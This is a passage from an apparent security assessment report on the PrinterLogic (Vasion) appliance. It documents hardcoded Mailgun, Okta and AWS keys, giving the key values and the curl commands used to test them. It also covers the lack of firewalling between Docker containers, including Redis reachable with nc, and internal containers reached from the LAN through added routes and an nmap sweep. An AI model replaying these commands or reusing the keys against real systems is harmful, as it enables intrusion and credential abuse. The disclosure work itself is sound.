<span style="color: #666666">695</span>     <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Available executors: </span><span style="color: #19177C">$avail_ex</span><span style="color: #BA2121">&quot;</span>
<span style="color: #666666">696</span>     <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Busy executors: </span><span style="color: #19177C">$busy_ex</span><span style="color: #BA2121">&quot;</span>
<span style="color: #666666">697</span>     <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Queue length: </span><span style="color: #19177C">$queue_length</span><span style="color: #BA2121">&quot;</span>
<span style="color: #666666">698</span>   <span style="color: #008000; font-weight: bold">fi</span>
<span style="color: #666666">699</span>   <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[</span> <span style="color: #19177C">$VERIFY</span> -eq <span style="color: #666666">0</span> <span style="color: #666666">]</span>; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">700</span>     aws cloudwatch put-metric-data --metric-name <span style="color: #BA2121">&quot;JenkinsAvailableExecutors&quot;</span> --value <span style="color: #BA2121">&quot;</span><span style="color: #19177C">$avail_ex</span><span style="color: #BA2121">&quot;</span> --unit <span style="color: #BA2121">&quot;Count&quot;</span> <span style="color: #19177C">$CLOUDWATCH_OPTS</span>
<span style="color: #666666">701</span>     aws cloudwatch put-metric-data --metric-name <span style="color: #BA2121">&quot;JenkinsBusyExecutors&quot;</span> --value <span style="color: #BA2121">&quot;</span><span style="color: #19177C">$busy_ex</span><span style="color: #BA2121">&quot;</span> --unit <span style="color: #BA2121">&quot;Count&quot;</span> <span style="color: #19177C">$CLOUDWATCH_OPTS</span>
<span style="color: #666666">702</span>     aws cloudwatch put-metric-data --metric-name <span style="color: #BA2121">&quot;JenkinsQueueLength&quot;</span> --value <span style="color: #BA2121">&quot;</span><span style="color: #19177C">$queue_length</span><span style="color: #BA2121">&quot;</span> --unit <span style="color: #BA2121">&quot;Count&quot;</span> <span style="color: #19177C">$CLOUDWATCH_OPTS</span>
<span style="color: #666666">703</span>   <span style="color: #008000; font-weight: bold">fi</span>
</pre></div>

<p>Storing AWS keys in the solution is not a normal situation. If these keys work, attackers can use them to compromise infrastructures and start a supply chain attack against customers.</p>
<p>The CI/CD scripts provide a lot of information to attackers and can be used for lateral movement in order to compromise the PrinterLogic infrastructure.</p>
<p><a id="va-hardcoded-mailgun-credentials"></a></p>
<h2>Details - Hardcoded Mailgun credentials</h2>
<p>It is possible to extract Mailgun secret keys from .env files:</p>
<pre><code>root@printerlogic:/var/lib/docker/overlay2# docker exec -it 5513823753ee bash 
root@5513823753ee:/var/www/app# cat .env 
[...]
MAILGUN_DOMAIN=mg.printerlogic.com
MAILGUN_SECRET=key-d5f3073e938dd40c6a0bda511078a5e8
</code></pre>
<p>After testing this API key using the example provided in <a href="https://documentation.mailgun.com/en/latest/quickstart-sending.html#send-via-api">https://documentation.mailgun.com/en/latest/quickstart-sending.html#send-via-api</a>, the API seems to be inactive:</p>
<pre><code>kali% curl -s --user 'api:key-d5f3073e938dd40c6a0bda511078a5e8' \
    https://api.mailgun.net/v3/mg.printerlogic.com/messages \    
    -F from='Excited User &lt;mailgun@mg.printerlogic.com&gt;' \   
    -F to=[redacted]@[redacted] \                     
    -F subject='Hello' \             
    -F text='Testing API key - report PrinterLogic VA'

Forbidden                                                                                                                                                    
kali% curl -s --user 'api:d5f3073e938dd40c6a0bda511078a5e8' \    
    https://api.mailgun.net/v3/mg.printerlogic.com/messages \
    -F from='Excited User &lt;mailgun@mg.printerlogic.com&gt;' \
    -F to=[redacted]@[redatected] \
    -F subject='Hello' \
    -F text='Testing API key - report PrinterLogic VA'

Forbidden
</code></pre>
<p>While this API key is disabled, it is recommended not to store secret keys in Docker instances.</p>
<p><a id="va-hardcoded-okta-private-key"></a></p>
<h2>Details - Hardcoded OKTA Private key</h2>
<p>Okta is a trusted platform for Single Sign-On.</p>
<p>An Okta private key was found along with configuration options in .env files:</p>
<pre><code>kali% grep -i okta **/.env
  local secrets="DB_PASSWORD LACEWORK_TOKEN DATADOG_LICENSE OKTA_API_KEY MC_API_PASSWORD MS_AUTH_KEY APP_AWS_SECRET_ACCESS_KEY"
API_OKTA_URL=http://okta.printercloud
  local secrets="DB_PASSWORD LACEWORK_TOKEN DATADOG_LICENSE OKTA_API_KEY MC_API_PASSWORD MS_AUTH_KEY APP_AWS_SECRET_ACCESS_KEY"

OKTA_API_KEY=00ePtVAhUmRPp3DkxP1YIPrnQQHjocNs3M3p_NzYlQ# PHP_IDE_CONFIG identifies the code base to PhpStorm while debugging
OKTA_BASE_URL=https://vasion.okta.com/
OKTA_CLIENT_ID=${WILDEPRINTERS_OKTA_CLIENT_ID:-}
OKTA_CLIENT_SECRET=${WILDEPRINTERS_OKTA_CLIENT_SECRET:-}
OKTA_LOGOUT_REDIRECT_URI=${PRINTERCLOUD_SCHEME:-https}://migration.${PRINTERCLOUD_APP_DOMAIN}/
OKTA_TENANT_URL=${OKTA_TENANT_URL:-https://printerlogicops-admin.okta.com}
OKTA_TENANT_URL=https://acme2.oktapreview.com
API_OKTA_URL=http://okta.printercloud
API_OKTA_URL=https://okta
OKTA_BASE_URL=https://vasion.okta.com/
OKTA_TENANT_URL=${OKTA_TENANT_URL:-https://printerlogicops-admin.okta.com}
OKTA_TENANT_URL=https://acme2.oktapreview.com
# The OKTA_TENANT_URL is currently set in the secrets file for each environment
# Okta Microservice API
API_OKTA_URL=https://okta
API_OKTA_VERIFYSSL=false
</code></pre>
<p>After testing this API key, it appears not to be valid:</p>
<pre><code>kali% curl -s -H "Authorization: SSWS 00ePtVAhUmRPp3DkxP1YIPrnQQHjocNs3M3p_NzYlQ" https://vasion.okta.com/api/v1/meta/types/user
{"errorCode":"E0000011","errorSummary":"Invalid token provided","errorLink":"E0000011","errorId":"oaetRN3rSwbROWcHTQRT7uQpA","errorCauses":[]}
kali% curl -s -H "Authorization: SSWS 00ePtVAhUmRPp3DkxP1YIPrnQQHjocNs3M3p_NzYlQ" https://printerlogicops-admin.okta.com/api/v1/meta/types/user
{"errorCode":"E0000011","errorSummary":"Invalid token provided","errorLink":"E0000011","errorId":"oaezEnKwIo6Rsyu6lRJCuu7Jg","errorCauses":[]}
kali% curl -s -kv -H "Authorization: SSWS 00ePtVAhUmRPp3DkxP1YIPrnQQHjocNs3M3p_NzYlQ" https://acme2.oktapreview.com/api/v1/meta/types/user
{"errorCode":"E0000011","errorSummary":"Invalid token provided","errorLink":"E0000011","errorId":"oaekbszU1leTMa0p1PlOjlSuQ","errorCauses":[]}
kali%
</code></pre>
<p>Storing private keys in the solution is not a normal situation. If these keys work, attackers can use them to compromise infrastructures and start a supply chain attack against customers.</p>
<p><a id="va-lack-of-fw"></a></p>
<h2>Details - Lack of firewall between Docker instances</h2>
<p>The solution uses 40 different Docker instances with several networks.</p>
<p>Listing of Docker instances:</p>
<pre><code>root@printerlogic:~# docker ps
CONTAINER ID        IMAGE                            COMMAND                  CREATED             STATUS                       PORTS                            NAMES
16178d2bccb2        printerlogic/va-api:1.1.4        "/opt/entrypoint.sh"   About an hour ago   Up About an hour (healthy)   80/tcp                           printercloud-appliance_va-api.1.fwacyv7l7gqxqrtwox45kvp1i
9f72609937de        printerlogic/pi:5.0.6539         "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_worker-pi-seeder.1.tbniqiidu8vtqpjtxjwh8oxsm
a393b51c084e        printerlogic/authn:1.0.257       "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_authn.1.jx70uxweg3iown085yiuis4j6
7a508d3d8623        printerlogic/oncp-hold:v1.0.31   "./cloud-print-job-h"  About an hour ago   Up About an hour (healthy)   80/tcp                           printercloud_oncp-hold.1.u3ac7ousxjn4ff5kkcvwgf9n4
69e727ce5901        printerlogic/pi:5.0.6539         "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_pi.1.nk5ouy3a7jwid082dhzl0mix5
d4a0594b6121        printerlogic/ebc:1.0.34          "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 9229/tcp                 printercloud_ebc.1.1e4rjf6mzq9t53swqdgxgfnwu
ed12cf7e4428        printerlogic/oncp-reg:1.0.15     "/opt/entrypoint.sh"   About an hour ago   Up About an hour (healthy)                                    printercloud_oncp-reg.1.y5dmk4y84g6rjyrt4t53syutz
0ee9b6a63f59        printerlogic/idpi:1.0.6          "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_idpi.1.35xxr3pqef00ivcn2no6y90rr
6092ba3e4189        printerlogic/oncp-pgw:v1.0.21    "./cloud-print-print"  About an hour ago   Up About an hour (healthy)   80-81/tcp                        printercloud_oncp-pgw.1.x9j0c6o7ydf0ehb2pmwxb70fj
11146de0ed76        dperson/samba:latest             "/sbin/tini -- /opt/"  About an hour ago   Up About an hour (healthy)   139/tcp, 137-138/udp, 445/tcp    config_samba.1.dfwyt1m90ab30k75fogxhcxcz
7d39399f459a        printerlogic/pi:5.0.6539         "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_worker-pi-reports.1.es8sfg9p6zya8r8396izh5z1i
bb96b17d45b8        printerlogic/pi:5.0.6539         "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_worker-pi-snmp.1.ttxndt3y7brnkw95vxluhht7l
f784e1b43237        printerlogic/qms:1.0.124         "/opt/entrypoint.sh"   About an hour ago   Up About an hour (healthy)                                    printercloud_qms.1.ek9zr8g67vb9k0s1n9nv2s736
9ad5da8b9d25        printerlogic/sched:1.0.18        "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000/tcp        printercloud-appliance_worker-scheduler.1.sy93cqxhn8fjypvfg9eu78may
a2cac82b5586        printerlogic/users:5.186.1       "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_users.1.zoorlq8nwkx15smt2cegigo8h
b3b7793a3e95        printerlogic/pi:5.0.6539         "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_worker-pi-low.1.whls4vm5xshz3h44c462iwdc1
77c42d53c3b2        mysql:8.0.26                     "docker-entrypoint.s"  About an hour ago   Up About an hour (healthy)   3306/tcp, 33060/tcp              storage_mysql.1.ff8nbsv250u5d3vqk9r62ripe
b4f9ccdf92cb        printerlogic/gw:1.208.5          "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_gw.1.vznnoqqf3kbhcwfwkl3plzi39
ac69cca5df62        printerlogic/pi:5.0.6539         "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_worker-pi-high.1.3cr0gdxirucwzdk2j5d0rbtja
f37db8c79a50        printerlogic/br:1.0.62           "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp                  printercloud_br.1.30m12skgwj5mu3y0ypfkp319q
9098f6052c94        printerlogic/identity:v1.0.88    "/usr/local/bin/iden"  About an hour ago   Up About an hour (healthy)   80/tcp                           printercloud_identity.1.8x0lwby90079bojeabu8vhead
0bf820403a1a        printerlogic/edw:1.0.44          "/opt/entrypoint.sh"   About an hour ago   Up About an hour (healthy)                                    printercloud_edw.1.yt5pd4mmletn81vs3wo5dz77q
bf43c1f6503e        printerlogic/users:5.186.1       "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_worker-users-queue.1.n3hbhjezaps6gwkw1nuqupdq4
bc477aaff3d7        printerlogic/oncp-ofn:v1.0.6     "off-network-app"        About an hour ago   Up About an hour (healthy)   80/tcp                           printercloud_oncp-ofn.1.szvk26xlr897j96p2z29hlv9p
171c014430d7        printerlogic/tree:1.0.57         "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_tree.1.7n99xw0qv856wjvj3eleaflij
a7656e45349d        traefik:latest                   "/srv/entrypoint.sh"   About an hour ago   Up About an hour             80/tcp                           networking_traefik.1.rjigvw3twkt4qkeldzbqbqn2u
8ec8a6bf4555        printerlogic/scim:1.0.9          "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_scim.1.okyfdbo5ct76v54eppsanw0me
e9994d5a21bf        printerlogic/prs:1.0.2           "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 9229/tcp                 printercloud_prs.1.6uuzdvqkb39u910gw9e3yupfy
5b99b9c2a4b2        printerlogic/eb:0.0.4            "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   3000/tcp, 9229/tcp               printercloud_eb.1.wtzjn9sdbl6wva6dy3u1y1nh5
d2e3989f4cf3        printerlogic/cpp-ui:1.80.5       "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000-9001/tcp   printercloud_cpp-ui.1.qhmgeshht9gip0quyhppdogv3
fce5597bbe3d        printerlogic/va-cdn:0.0.435      "/docker-entrypoint."  About an hour ago   Up About an hour             80/tcp                           printercloud-appliance_va-cdn.1.copecxekt4rwuxfq4tynfm1a6
294dbdd973da        printerlogic/scd:1.0.70          "/var/www/app/.docke"  About an hour ago   Up About an hour             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_scd.1.3eef4r68kmkqnc5dcswa3xjhv
6cb464ab04b7        portainer/agent:latest           "./agent"                About an hour ago   Up About an hour                                              printercloud_portainer-agent.a6zgwxfp4n2v4tdi8u7b40shy.aoew1w8ym8p1hai6ch38dau7j
55b64c63a9f6        printerlogic/pq:5.0.124          "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 443/tcp, 9000/tcp        printercloud_pq.1.vwp9poc8belv24mxwijeeetct
a7bff45e538c        printerlogic/ofn:1.108.0         "off-network-app"        About an hour ago   Up About an hour (healthy)   80/tcp                           printercloud_ofn.1.18qn5bj4eqgpbq2d94k6hy8vx
317daac676fd        printerlogic/scss:1.0.39         "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 9229/tcp                 printercloud_scss.1.uc6fcunwy1s3hdb6di4avqlzb
6b3781947b83        printerlogic/client:25.1.0.551   "/bin/sh -c 'supervi"  About an hour ago   Up About an hour                                              printercloud-appliance_client.1.pnbxglabahqd9prozbvbs55sc
1d856b21e63d        redis:5-alpine                   "docker-entrypoint.s"  About an hour ago   Up About an hour (healthy)   6379/tcp                         storage_redis.1.zachure4n159uah7xsu3ixau6
a842502dcc97        printerlogic/cat:1.0.58          "/var/www/app/.docke"  About an hour ago   Up About an hour (healthy)   80/tcp, 9229/tcp                 printercloud_cat.a6zgwxfp4n2v4tdi8u7b40shy.fgp2p5wo56hg4sanjmirpoyzl
022c2a2201b4        printerlogic/hive:1.1.30         "/opt/entrypoint.sh"   5 days ago          Up About an hour                                              cicd_hive_1
root@printerlogic:~#
</code></pre>
<p>By default, there are no firewall rules between Docker instances, allowing an attacker to compromise an instance to attack other instances (<code>lateral movements</code>).</p>
<p>For example, it is possible to reach a Docker instance providing PHP webpages from another instance.</p>
<p>HTTP requests inside the <code>172.17.130.0/24</code> network:</p>
<pre><code>bash-5.0# curl -kv http://172.17.130.40/index.php
* Uses proxy env variable no_proxy == 'fake-host,localhost,*.local,*.printercloud,*.overlay,127.0.0.0/8,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16'
*   Trying 172.17.130.40:80...
* TCP_NODELAY set
* Connected to 172.17.130.40 (172.17.130.40) port 80 (#0)
&gt; GET /index.php HTTP/1.1
&gt; Host: 172.17.130.40
&gt; User-Agent: curl/7.66.0
&gt; Accept: */*
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Server: nginx
&lt; Content-Type: text/html; charset=UTF-8
&lt; Transfer-Encoding: chunked
&lt; Connection: keep-alive
&lt; Cache-Control: no-cache, private
&lt; Date: Wed, 26 Jan 2022 04:59:37 GMT
* Added cookie XSRF-TOKEN="eyJpdiI6Ijg3VVVyUzNiQ0dDblVmR3ZGWFRSSFE9PSIsInZhbHVlIjoiWVhaYzFSMExUUmI0bU9yeHoxRmhjQzJ6UFhPYVFSbllvdE9jQmRLbWhkRWFIdWt3b2puc2lRSVRpVnVuTXJ1KyIsIm1hYyI6IjFkMTk3NWRhMzgwNDViOTU1OTczMjJhNTRiMDUwMDFiMWMwNWU1NzlhZTUwNmExNDk1YTJiMTJkNjY5ZjFmOTgifQ%3D%3D" for domain 172.17.130.40, path /, expire 1643180377
&lt; Set-Cookie: XSRF-TOKEN=eyJpdiI6Ijg3VVVyUzNiQ0dDblVmR3ZGWFRSSFE9PSIsInZhbHVlIjoiWVhaYzFSMExUUmI0bU9yeHoxRmhjQzJ6UFhPYVFSbllvdE9jQmRLbWhkRWFIdWt3b2puc2lRSVRpVnVuTXJ1KyIsIm1hYyI6IjFkMTk3NWRhMzgwNDViOTU1OTczMjJhNTRiMDUwMDFiMWMwNWU1NzlhZTUwNmExNDk1YTJiMTJkNjY5ZjFmOTgifQ%3D%3D; expires=Wed, 26-Jan-2022 06:59:37 GMT; Max-Age=7200; path=/
&lt;
* Connection #0 to host 172.17.130.40 left intact
</code></pre>
<p>The Redis instance is directly reachable from this internal network - this allows an attacker to compromise the Redis instance from any Docker instance:</p>
<pre><code>printerlogic:~# docker ps|grep redis
1d856b21e63d        redis:5-alpine                   "docker-entrypoint.sh"  About an hour ago   Up About an hour (healthy)   6379/tcp                         storage_redis.1.zachure4n159uah7xsu3ixau6
root@printerlogic:~# docker inspect 1d856b21e63d|grep 172
            "SandboxID": "3aa3895b4d208b6e938c5e11729dfc07522858896f2cd91b1666b51f7b6d8811",
                        "IPv4Address": "172.17.130.35"
                    "IPAddress": "172.17.130.35",
root@printerlogic:~#
</code></pre>
<p>From <code>printerlogic/scd:1.0.70</code>, there is a full access to the redis instance. </p>
<pre><code>bash-5.0# nc 172.17.130.21 6379
HELO
-ERR unknown command `HELO`, with args beginning with:
</code></pre>
<p>All the Docker instances have access to the redis instance, meaning it is possible from any docker instance to execute commands on the Redis instance using master/slave replication (<a href="https://www.rapid7.com/db/modules/exploit/linux/redis/redis_replication_cmd_exec/">https://www.rapid7.com/db/modules/exploit/linux/redis/redis_replication_cmd_exec/</a>).</p>
<p>An attacker compromising a Docker instance can use lateral movement to compromise other Docker instances. Compromising the Redis instance is trivial.</p>
<p><a id="va-insecure-access-docker-instances-from-wan"></a></p>
<h2>Details - Insecure access to Docker instances from the WAN</h2>
<p>An attacker with a machine located on the same network segment (layer 2) can add a route to the IPs of Docker instances using the external IP of the solution as a gateway. He will then be able to reach internal services running inside Docker instances - PrinterLogic will act as a network gateway, providing access to the internal Docker instances.</p>
<p>Proof of Concept:</p>
<p>On the machine running PrinterLogic VA, the docker instance <code>printerlogic/ebc</code> uses 2 IPs (<code>172.17.130.74</code> and <code>172.17.0.156</code>):</p>
<p>Configuration of <code>printerlogic/ebc</code>:</p>
<pre><code>root@printerlogic:/var/lib/docker/overlay2# docker ps | grep printerlogic/ebc:1.0.34
d61d429548aa        printerlogic/ebc:1.0.34          "/var/www/app/.docke"  3 hours ago         Up 3 hours (healthy)   80/tcp, 9229/tcp                 printercloud_ebc.1.iat3at5k4neth8k016wz5cjq3
root@printerlogic:/var/lib/docker/overlay2# docker exec -it d61d429548aa /bin/bash
bash-5.0# ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:82:4A  
          inet addr:172.17.130.74  Bcast:172.17.131.255  Mask:255.255.254.0
          UP BROADCAST RUNNING MULTICAST  MTU:1424  Metric:1
          RX packets:76 errors:0 dropped:0 overruns:0 frame:0
          TX packets:39 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:7533 (7.3 KiB)  TX bytes:4160 (4.0 KiB)

eth1      Link encap:Ethernet  HWaddr 02:42:AC:11:00:9C  
          inet addr:172.17.0.156  Bcast:172.17.0.255  Mask:255.255.255.128
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:124 errors:0 dropped:0 overruns:0 frame:0
          TX packets:86 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:8599 (8.3 KiB)  TX bytes:36949 (36.0 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:9376 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9376 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1319224 (1.2 MiB)  TX bytes:1319224 (1.2 MiB)

bash-5.0#
</code></pre>
<p>From the attacker machine, it is required to add routes to internal IP of Docker instances, using the IP of the PrinterLogic server as a gateway (10.105.0.241).</p>
<p>Adding a route to rach a Docker instance:</p>
<pre><code>kali# route add -host 172.17.0.156 gw 10.105.0.241
kali# traceroute -nI 172.17.0.156 
traceroute to 172.17.0.156 (172.17.0.156), 30 hops max, 60 byte packets
 1  10.105.0.241  0.269 ms  0.259 ms  0.259 ms
 2  172.17.0.156  0.441 ms  0.459 ms  0.460 ms
</code></pre>
<p>It is now possible to interact with the internal webserver running on the Docker instance with the IP 172.16.0.156 (<code>printerlogic/ebb</code>):</p>
<pre><code>kali% curl -kv http://172.17.0.156/
*   Trying 172.17.0.156:80...
* Connected to 172.17.0.156 (172.17.0.156) port 80 (#0)
&gt; GET / HTTP/1.1
&gt; Host: 172.17.0.156
&gt; User-Agent: curl/7.79.1
&gt; Accept: */*
&gt; 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 302 Found
&lt; Content-Security-Policy: default-src 'self';base-uri 'self';block-all-mixed-content;font-src 'self' https: data:;frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
* Connection #0 to host 172.17.0.156 left intact
Found. Redirecting to /api-docs
%
</code></pre>
<p>We have a full access to the internal webserver running inside a Docker instance</p>
<p>By default, the <code>docker_gwbridge</code> network will be reachable from the WAN. This network is used by the Docker instances to get connectivity:</p>
<p>Docker network configuration:</p>
<pre><code>root@printerlogic:/var/www/efs_storage/logs/oddhok71vqjdjhjtous8xy3vx# docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
7a0cd0d79106        bridge              bridge              local
a0f7589c4c27        cicd_default        bridge              local
yyeicsrfgvdj        config_default      overlay             swarm
7d70cb612a96        docker_gwbridge     bridge              local
e500f5cc9286        host                host                local
g13ns8jd9aw9        ingress             overlay             swarm
22493bb20f06        none                null                local
03r08ptuv9li        printercloud        overlay             swarm
19d8681ed357        secrets_default     bridge              local
tke7a3glgyqe        storage_default     overlay             swarm
root@printerlogic:/var/www/efs_storage/logs/oddhok71vqjdjhjtous8xy3vx# docker network inspect docker_gwbridge | grep 172
                    "Subnet": "172.17.0.128/25",
                    "Gateway": "172.17.0.129"
                "IPv4Address": "172.17.0.169/25",
                "IPv4Address": "172.17.0.145/25",
                "IPv4Address": "172.17.0.134/25",
                "IPv4Address": "172.17.0.136/25",
</code></pre>
<p>We can add routes for the entire 172.17.0.0/16 IP range:</p>
<pre><code>kali# route add -net 172.17.0.0/16 gw 10.105.0.241
</code></pre>
<p>An attacker scanning the first /24 IP range will detect 29 open HTTP servers.</p>
<p>Full access to all the internal webserver providing APIs without authentication:</p>
<pre><code>kali% nmap -sT -p 80 -v -Pn -n -sV 172.17.0.0/24 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 04:37 EST
NSE: Loaded 45 scripts for scanning.
Initiating Connect Scan at 04:37
Scanning 256 hosts [1 port/host]
Discovered open port 80/tcp on 172.17.0.1
Discovered open port 80/tcp on 172.17.0.135
Discovered open port 80/tcp on 172.17.0.138
Discovered open port 80/tcp on 172.17.0.141
Discovered open port 80/tcp on 172.17.0.142
Discovered open port 80/tcp on 172.17.0.129
Discovered open port 80/tcp on 172.17.0.143
Discovered open port 80/tcp on 172.17.0.146
Discovered open port 80/tcp on 172.17.0.147
Discovered open port 80/tcp on 172.17.0.149
Discovered open port 80/tcp on 172.17.0.151
Discovered open port 80/tcp on 172.17.0.152
Discovered open port 80/tcp on 172.17.0.155
Discovered open port 80/tcp on 172.17.0.156
Discovered open port 80/tcp on 172.17.0.157
Discovered open port 80/tcp on 172.17.0.159
Discovered open port 80/tcp on 172.17.0.160
Discovered open port 80/tcp on 172.17.0.161
Discovered open port 80/tcp on 172.17.0.162
Discovered open port 80/tcp on 172.17.0.163
Discovered open port 80/tcp on 172.17.0.164
Discovered open port 80/tcp on 172.17.0.165
Discovered open port 80/tcp on 172.17.0.166
Discovered open port 80/tcp on 172.17.0.167
Discovered open port 80/tcp on 172.17.0.168
Discovered open port 80/tcp on 172.17.0.169
Discovered open port 80/tcp on 172.17.0.130
Discovered open port 80/tcp on 172.17.0.140
Discovered open port 80/tcp on 172.17.0.144
</code></pre>
<p>When these webservers are accessed through a browser, it appears there are internal webservers providing APIs. The attacker will have a full access to these servers without authentication.    </p>
<p>Full access to all the internal webserver providing APIs, without authentication</p>
<p><img alt="" src="images/2025-vasion-report-1-api-01.png" /></p>
<p><a href="images/2025-vasion-report-1-api-01-full.png">Click here for full image</a></p>
<p>Full access to all the internal webserver providing APIs, without authentication</p>
<p><img alt="" src="images/2025-vasion-report-1-api-02.png" /></p>
<p><a href="images/2025-vasion-report-1-api-02-full.png">Click here for full image</a></p>
<p>Full access to all the internal webserver providing APIs, without authentication</p>
<p><img alt="" src="images/2025-vasion-report-1-api-03.png" /></p>
<p><a href="images/2025-vasion-report-1-api-03-full.png">Click here for full image</a></p>
<p>An attacker located on the same network segment can reach internal services and bypass the entire security of the solution.</p>
<p>The attack surface is very large because of the exposure of the internal Docker instances.</p>
<p>For example, an attacker reaching the previous Redis instance will achieve a Remote Code Execution against the appliance.</p>
<p><a id="va-insecure-security-architecture"></a></p>
<h2>Details - Incorrect security architecture and wrong permissions in /var/www/efs_storage allowing allowing to compromise the solution</h2>
<p>The directory <code>/var/www/efs_storage</code> contains all the configuration files of the appliance. A read/write access to this directory will allow an attacker to compromise the appliance.</p>
<p>It appears the Docker instances have access to <code>/var/www/efs_storage</code>, as shown below.</p>
<p>Docker instances with access to <code>/var/www/efs_storage</code>:</p>
<pre><code>16178d2bccb2 printerlogic/va-api:1.1.4 "/opt/entrypoint.sh"  4 hours ago Up 4 hours (healthy) 80/tcp printercloud-appliance_va-api.1.fwacyv7l7gqxqrtwox45kvp1i
                    "Source": "/var/www/efs_storage",
                    "Target": "/var/www/efs_storage"
                "Source": "/var/www/efs_storage",
                "Destination": "/var/www/efs_storage",
                "APPLIANCE_STORAGE_TARGET=/var/www/efs_storage",
                "SHARED_STORAGE=/var/www/efs_storage",

9f72609937de printerlogic/pi:5.0.6539 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-seeder.1.tbniqiidu8vtqpjtxjwh8oxsm
                    "Source": "/var/www/efs_storage/pi/cache",
                    "Source": "/var/www/efs_storage/null",
                    "Source": "/var/www/efs_storage/pi/storage",
                    "Source": "/var/www/efs_storage/pi/storage/api",
                    "Source": "/var/www/efs_storage/pi/storage/app",
                    "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                    "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/cache",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/storage",
                "Source": "/var/www/efs_storage/pi/storage/api",
                "Source": "/var/www/efs_storage/pi/storage/app",
                "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                "Source": "/var/www/efs_storage/null",
                "SHARED_STORAGE=/var/www/efs_storage",

a393b51c084e printerlogic/authn:1.0.257 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_authn.1.jx70uxweg3iown085yiuis4j6
                "SHARED_STORAGE=/var/www/efs_storage",

7a508d3d8623 printerlogic/oncp-hold:v1.0.31 "./cloud-print-job-h" 4 hours ago Up 4 hours (healthy) 80/tcp printercloud_oncp-hold.1.u3ac7ousxjn4ff5kkcvwgf9n4
                "SHARED_STORAGE=/var/www/efs_storage",

69e727ce5901 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_pi.1.nk5ouy3a7jwid082dhzl0mix5
                    "Source": "/var/www/efs_storage/pi/cache",
                    "Source": "/var/www/efs_storage/null",
                    "Source": "/var/www/efs_storage/pi/storage",
                    "Source": "/var/www/efs_storage/pi/storage/api",
                    "Source": "/var/www/efs_storage/pi/storage/app",
                    "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                    "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/storage",
                "Source": "/var/www/efs_storage/pi/storage/app",
                "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                "Source": "/var/www/efs_storage/pi/cache",
                "Source": "/var/www/efs_storage/pi/storage/api",
                "SHARED_STORAGE=/var/www/efs_storage",

